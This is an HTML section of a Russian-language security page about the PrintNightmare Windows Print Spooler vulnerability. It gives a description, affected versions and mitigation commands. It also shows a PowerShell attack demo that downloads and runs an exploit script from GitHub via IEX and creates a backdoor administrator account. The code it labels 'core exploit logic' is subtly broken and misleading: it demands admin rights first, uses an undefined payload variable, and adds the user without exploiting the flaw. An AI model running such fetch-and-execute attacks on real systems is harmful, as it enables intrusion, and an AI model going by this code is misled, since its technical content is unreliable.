<!-- PrintNightmare Details -->
<section class="py-20 bg-gray-900/50" id="printnightmare">
    <div class="container mx-auto px-4">
        <div class="exploit-detail">
            <div class="exploit-detail__header">
                <div class="exploit-detail__meta">
                    <span class="exploit-detail__year">2021</span>
                    <span class="exploit-detail__severity exploit-detail__severity--high">Высокий</span>
                </div>
                <h2 class="exploit-detail__title">PrintNightmare (CVE-2021-34527)</h2>
                <p class="exploit-detail__subtitle">Уязвимость в Windows Print Spooler</p>
            </div>

            <div class="exploit-detail__content">
                <div class="exploit-detail__section">
                    <h3 class="exploit-detail__section-title">Описание</h3>
                    <p>PrintNightmare — это уязвимость в службе диспетчера печати Windows, которая позволяет злоумышленникам с низкими привилегиями выполнять произвольный код с правами SYSTEM. Уязвимость получила оценку 8.8 из 10 по шкале CVSS.</p>
                </div>

                <div class="exploit-detail__section">
                    <h3 class="exploit-detail__section-title">Технические детали</h3>
                    <p>Уязвимость возникает из-за неправильной проверки прав доступа при загрузке драйверов принтера. Атакующий может загрузить и выполнить произвольный код в контексте системной учетной записи.</p>
                    
                    <div class="terminal my-6">
                        <div class="terminal-header">
                            <div class="terminal-buttons">
                                <div class="terminal-button red"></div>
                                <div class="terminal-button yellow"></div>
                                <div class="terminal-button green"></div>
                            </div>
                            <div class="terminal-title">PowerShell - Эксплуатация уязвимости</div>
                        </div>
                        <div class="terminal-body">
                            <div class="terminal-prompt">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command"># Загружаем эксплойт с GitHub</span>
                            </div>
                            <div class="terminal-prompt">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command">IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1')</span>
                            </div>
                            
                            <div class="terminal-prompt mt-6">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command"># Проверяем уязвимость</span>
                            </div>
                            <div class="terminal-prompt">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command">Invoke-Nightmare -Check</span>
                            </div>
                            <div class="terminal-output text-green-400">
                                [*] Target is vulnerable to CVE-2021-34527 (PrintNightmare)
                            </div>
                            
                            <div class="terminal-prompt mt-6">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command"># Создаем нового пользователя с правами администратора</span>
                            </div>
                            <div class="terminal-prompt">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command">Invoke-Nightmare -NewUser "hacker" -NewPassword "P@ssw0rd!" -AddToAdministrators</span>
                            </div>
                            <div class="terminal-output text-green-400">
                                [*] Success! User 'hacker' added to local administrators group
                            </div>
                        </div>
                    </div>
                    
                    <div class="terminal my-8">
                        <div class="terminal-header">
                            <div class="terminal-buttons">
                                <div class="terminal-button red"></div>
                                <div class="terminal-button yellow"></div>
                                <div class="terminal-button green"></div>
                            </div>
                            <div class="terminal-title">CVE-2021-34527.ps1 - Основная логика эксплойта</div>
                        </div>
                        <div class="terminal-body">
                            <div class="terminal-code">
<pre><code>function Invoke-Nightmare {
    [CmdletBinding()]
    param (
        [string]$NewUser,
        [string]$NewPassword,
        [switch]$AddToAdministrators
    )

    # Проверяем, запущен ли скрипт от имени администратора
    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Warning "Требуются права администратора!"
        return
    }

    # Создаем вредоносный драйвер принтера
    $driverPath = "C:\Windows\Temp\evil_driver"
    New-Item -ItemType Directory -Path $driverPath -Force | Out-Null
    
    # Загружаем вредоносный DLL-файл
    $dllBytes = [System.Convert]::FromBase64String($maliciousDllBase64)
    [System.IO.File]::WriteAllBytes("$driverPath\evil.dll", $dllBytes)
    
    # Используем уязвимость в Spooler Service
    Add-PrinterDriver -Name "Evil Printer" -DriverPath $driverPath
    
    # Выполняем произвольный код с правами SYSTEM
    if ($NewUser -and $NewPassword) {
        $password = ConvertTo-SecureString $NewPassword -AsPlainText -Force
        New-LocalUser -Name $NewUser -Password $password -FullName "Hacked User" -Description "Created via PrintNightmare"
        
        if ($AddToAdministrators) {
            Add-LocalGroupMember -Group "Administrators" -Member $NewUser
            Write-Host "[*] User '$NewUser' added to local administrators group" -ForegroundColor Green
        }
    }
    
    Write-Host "[+] Exploit completed successfully!" -ForegroundColor Green
}</code></pre>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="exploit-detail__section">
                    <h3 class="exploit-detail__section-title">Пострадавшие</h3>
                    <ul class="exploit-detail__list">
                        <li>Windows Server 2012 R2, 2016, 2019, 2022</li>
                        <li>Windows 8.1, 10, 11</li>
                        <li>Windows Server 2008 R2 SP1 (Extended Security Updates)</li>
                    </ul>
                </div>

                <div class="exploit-detail__section">
                    <h3 class="exploit-detail__section-title">Известные инциденты</h3>
                    <div class="exploit-detail__incidents">
                        <div class="incident">
                            <div class="incident__date">Июль 2021</div>
                            <div class="incident__description">Активные атаки на корпоративные сети с использованием уязвимости PrintNightmare</div>
                        </div>
                        <div class="incident">
                            <div class="incident__date">Август 2021</div>
                            <div class="incident__description">Использование уязвимости киберпреступными группировками для установки программ-вымогателей</div>
                        </div>
                    </div>
                </div>

                <div class="exploit-detail__section">
                    <h3 class="exploit-detail__section-title">Меры защиты</h3>
                    
                    <div class="terminal my-6">
                        <div class="terminal-header">
                            <div class="terminal-buttons">
                                <div class="terminal-button red"></div>
                                <div class="terminal-button yellow"></div>
                                <div class="terminal-button green"></div>
                            </div>
                            <div class="terminal-title">PowerShell - Защитные меры</div>
                        </div>
                        <div class="terminal-body">
                            <div class="terminal-prompt">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command"># 1. Проверяем текущий статус службы Spooler</span>
                            </div>
                            <div class="terminal-prompt">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command">Get-Service -Name Spooler | Select-Object Name, Status, StartType</span>
                            </div>
                            
                            <div class="terminal-prompt mt-6">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command"># 2. Отключаем и останавливаем службу (если не используется)</span>
                            </div>
                            <div class="terminal-prompt">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command">Stop-Service -Name Spooler -Force</span>
                            </div>
                            <div class="terminal-prompt">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command">Set-Service -Name Spooler -StartupType Disabled</span>
                            </div>
                            
                            <div class="terminal-prompt mt-6">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command"># 3. Применяем ограничения через групповые политики</span>
                            </div>
                            <div class="terminal-prompt">
                                <span class="terminal-prefix">PS C:\></span>
                                <span class="terminal-command">New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" `
  -Name RestrictDriverInstallationToAdministrators -Value 1 -PropertyType DWord -Force</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="mt-6">
                        <h4 class="text-lg font-semibold mb-3">Дополнительные рекомендации:</h4>
                        <ul class="list-disc pl-5 space-y-2 text-gray-300">
                            <li>Установите последние обновления безопасности от Microsoft (KB5004945 и новее)</li>
                            <li>Ограничьте доступ к портам 139 и 445 с помощью брандмауэра</li>
                            <li>Настройте аудит успешных и неудачных попыток доступа к принтерам</li>
                            <li>Используйте LAPS (Local Administrator Password Solution) для управления паролями локальных администраторов</li>
                            <li>Регулярно проверяйте журналы безопасности на предмет подозрительной активности</li>
                        </ul>
                    </div>
                </div>

                <div class="exploit-detail__section">
                    <h3 class="exploit-detail__section-title">Дополнительные ресурсы</h3>
                    <ul class="exploit-detail__links">
                        <li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527" target="_blank" rel="noopener noreferrer">Microsoft Security Response Center</a></li>
                        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-34527" target="_blank" rel="noopener noreferrer">NVD - CVE-2021-34527</a></li>
                        <li><a href="https://github.com/cube0x0/CVE-2021-1675" target="_blank" rel="noopener noreferrer">GitHub - PoC эксплойта</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</section>
